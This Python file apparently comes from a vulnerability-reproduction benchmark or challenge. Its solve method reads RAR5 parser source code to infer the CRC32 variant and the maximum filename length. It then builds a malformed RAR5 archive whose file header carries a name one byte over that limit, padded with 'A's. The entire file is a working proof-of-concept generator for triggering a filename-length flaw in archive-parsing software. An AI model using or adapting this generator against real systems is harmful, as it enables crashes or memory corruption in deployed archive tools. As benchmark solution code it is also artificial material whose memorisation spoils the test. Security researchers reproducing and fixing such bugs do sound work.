import os
import re
import tarfile
import zlib
import struct
from typing import Iterable, Tuple, Optional, List


def _vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint must be non-negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _crc32_variant_from_source(src_path: str) -> str:
    # returns "zlib0" or "ff_xor"
    # Heuristic detection from source; default to zlib0.
    def iter_texts() -> Iterable[str]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith(".c") or lfn.endswith(".h") or lfn.endswith(".cc") or lfn.endswith(".cpp")):
                        continue
                    if "rar5" not in (root.lower() + "/" + lfn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            yield f.read().decode("utf-8", "ignore")
                    except OSError:
                        continue
        else:
            if tarfile.is_tarfile(src_path):
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        for m in tf.getmembers():
                            if not m.isfile():
                                continue
                            nm = m.name.lower()
                            if "rar5" not in nm:
                                continue
                            if not (nm.endswith(".c") or nm.endswith(".h") or nm.endswith(".cc") or nm.endswith(".cpp")):
                                continue
                            try:
                                data = tf.extractfile(m).read()
                            except Exception:
                                continue
                            yield data.decode("utf-8", "ignore")
                except Exception:
                    return
            else:
                return

    ff_hits = 0
    z0_hits = 0
    for txt in iter_texts():
        if "crc32" not in txt:
            continue
        if re.search(r"\bcrc32\s*\(\s*0xffffffff\b", txt, re.IGNORECASE) or re.search(
            r"\bcrc32\s*\(\s*0xFFFFFFFF\b", txt, re.IGNORECASE
        ):
            ff_hits += 1
        if re.search(r"\bcrc32\s*\(\s*0\s*,", txt):
            z0_hits += 1
        if re.search(r"\^\s*0xffffffff\b", txt, re.IGNORECASE) or re.search(r"\^\s*0xFFFFFFFF\b", txt, re.IGNORECASE):
            ff_hits += 1

    if ff_hits > z0_hits and ff_hits > 0:
        return "ff_xor"
    return "zlib0"


def _crc32(data: bytes, variant: str) -> int:
    if variant == "ff_xor":
        return (zlib.crc32(data, 0xFFFFFFFF) ^ 0xFFFFFFFF) & 0xFFFFFFFF
    return zlib.crc32(data) & 0xFFFFFFFF


def _guess_max_name_len(src_path: str) -> int:
    # Heuristically infer max filename length from source; fallback 1024.
    patterns = [
        r"#\s*define\s+\w*(?:RAR5|R5)?\w*NAME\w*MAX\w*\s+(0x[0-9a-fA-F]+|\d+)",
        r"#\s*define\s+\w*(?:RAR5|R5)?\w*FILENAME\w*MAX\w*\s+(0x[0-9a-fA-F]+|\d+)",
        r"\b(?:name|filename)\w*\s*length\w*\s*[>=]+\s*(0x[0-9a-fA-F]+|\d+)",
        r"\b(?:name|filename)\w*_?size\w*\s*[>=]+\s*(0x[0-9a-fA-F]+|\d+)",
        r"\b(?:name|filename)\w*_?len\w*\s*[>=]+\s*(0x[0-9a-fA-F]+|\d+)",
        r"\b(?:name|filename)\w*_?size\w*\s*>\s*(0x[0-9a-fA-F]+|\d+)",
        r"\b(?:name|filename)\w*_?len\w*\s*>\s*(0x[0-9a-fA-F]+|\d+)",
    ]

    def iter_sources() -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith(".c") or lfn.endswith(".h") or lfn.endswith(".cc") or lfn.endswith(".cpp")):
                        continue
                    full = (root.lower() + "/" + lfn)
                    if "rar5" not in full:
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            yield p, f.read().decode("utf-8", "ignore")
                    except OSError:
                        continue
        else:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        nm = m.name.lower()
                        if "rar5" not in nm:
                            continue
                        if not (nm.endswith(".c") or nm.endswith(".h") or nm.endswith(".cc") or nm.endswith(".cpp")):
                            continue
                        try:
                            data = tf.extractfile(m).read()
                        except Exception:
                            continue
                        yield m.name, data.decode("utf-8", "ignore")

    candidates: List[int] = []
    try:
        for name, txt in iter_sources():
            lt = txt.lower()
            if "name" not in lt and "filename" not in lt:
                continue
            for pat in patterns:
                for m in re.finditer(pat, txt, re.IGNORECASE):
                    val_s = m.group(1)
                    try:
                        v = int(val_s, 0)
                    except Exception:
                        continue
                    if 16 <= v <= 1_000_000:
                        candidates.append(v)
    except Exception:
        candidates = []

    # Prefer plausible limits (common: 256, 1024, 2048, 4096)
    plausible = [v for v in candidates if 64 <= v <= 65536]
    if not plausible:
        return 1024

    # Choose value closest to 1024 (a common filename cap)
    plausible.sort(key=lambda x: (abs(x - 1024), x))
    return plausible[0]


def _build_block(block_type: int, header_flags: int, body: bytes, crc_variant: str) -> bytes:
    t = _vint(block_type)
    f = _vint(header_flags)

    size = 0
    for _ in range(10):
        hdr = _vint(size) + t + f + body
        new_size = len(hdr)
        if new_size == size:
            break
        size = new_size
    hdr = _vint(size) + t + f + body
    c = _crc32(hdr, crc_variant)
    return struct.pack("<I", c) + hdr


class Solution:
    def solve(self, src_path: str) -> bytes:
        crc_variant = _crc32_variant_from_source(src_path)
        max_name = _guess_max_name_len(src_path)
        name_len = max_name + 1

        signature = b"Rar!\x1a\x07\x01\x00"

        # Main header: archive flags = 0
        main_body = _vint(0)
        main_block = _build_block(1, 0, main_body, crc_variant)

        # File header with name_len exceeding max
        # Header flags: include data size field (bit 1)
        # data_size = 0, file_flags = 1 (directory), unp_size=0, attr=0, comp_info=0, host_os=0
        name_bytes = b"A" * name_len
        file_body = (
            _vint(0)  # data_size
            + _vint(1)  # file_flags: directory
            + _vint(0)  # unpacked size
            + _vint(0)  # attributes
            + _vint(0)  # compression info
            + _vint(0)  # host OS
            + _vint(name_len)  # name length
            + name_bytes
        )
        file_block = _build_block(2, 2, file_body, crc_variant)

        # End of archive block (optional)
        end_body = _vint(0)
        end_block = _build_block(5, 0, end_body, crc_variant)

        return signature + main_block + file_block + end_block